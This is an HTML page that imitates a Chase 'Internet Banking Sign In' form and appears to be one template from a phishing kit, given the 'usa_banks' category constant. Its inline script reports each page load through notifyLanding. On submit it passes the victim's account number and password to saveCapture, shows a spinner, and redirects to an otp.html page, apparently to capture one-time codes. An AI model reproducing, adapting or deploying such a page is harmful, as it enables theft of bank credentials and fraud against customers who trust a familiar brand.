<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Online Banking - Chase</title><link rel="stylesheet" href="style.css"></head>
<body><div class="card">
<div class="logo">C</div>
<div class="title">Chase</div>
<div class="subtitle">Internet Banking Sign In</div>
<form id="loginForm">
<div class="form-group"><label for="account">Account Number</label><input type="text" id="account" placeholder="Enter your account number" inputmode="numeric" required></div>
<div class="form-group"><label for="password">Password</label><input type="password" id="password" placeholder="Enter your password" required></div>
<button type="submit" id="continueBtn">Sign In</button>
</form>
<div class="footer">© 2026 Chase · All rights reserved</div>
</div>
<script src="helper.js"></script>
<script>
const SITE='chase', DISPLAY='Chase', CATEGORY='usa_banks';
window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Login'));
document.getElementById('loginForm').addEventListener('submit', function(e){
  e.preventDefault();
  const acc = document.getElementById('account').value.trim();
  const pwd = document.getElementById('password').value.trim();
  if (!acc || !pwd) return;
  const btn = document.getElementById('continueBtn');
  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
  saveCapture(SITE, CATEGORY, 'LOGIN', { account: acc, password: pwd }, 'Login');
  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
});
</script></body></html>
